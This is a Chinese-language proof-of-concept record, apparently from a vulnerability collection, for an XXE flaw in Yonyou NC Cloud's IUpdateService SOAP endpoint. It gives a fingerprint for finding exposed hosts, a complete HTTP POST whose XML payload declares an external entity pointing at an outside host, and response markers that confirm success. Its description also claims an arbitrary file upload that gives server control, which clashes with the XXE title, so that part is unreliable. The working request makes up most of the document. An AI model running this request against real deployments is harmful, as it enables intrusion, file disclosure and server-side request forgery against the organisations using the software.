﻿# 用友NC Cloud IUpdateService接口存在XXE漏洞

> 更新时间：2024-02-01

> 漏洞编号：

> 漏洞说明：NC Cloud是用友推出的大型企业数字化平台。 用友网络科技股份有限公司NC Cloud存在任意文件上传漏洞，攻击者可利用该漏洞获取服务器控制权。该系统IUpdateService接口存在实体注入漏洞

> 漏洞特征：icon_hash="1085941792"

> 验证脚本：HTTP

```
POST /uapws/service/nc.uap.oba.update.IUpdateService HTTP/1.1
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
SOAPAction: urn:getResult
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:iup="http://update.oba.uap.nc/IUpdateService">
<soapenv:Header/>
<soapenv:Body>
<iup:getResult>
<!--type: string-->
<iup:string><![CDATA[
<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://www.baidu.com">%aaa;%ccc;%ddd;]>
<xxx/>]]></iup:string>
</iup:getResult>
</soapenv:Body>
</soapenv:Envelope>
```

> 响应代码特征：200

> 响应内容特征：getResultResponse

> 上传文件定位：


> 验证文件来源：用友NC Cloud IUpdateService接口存在XXE漏洞.poc
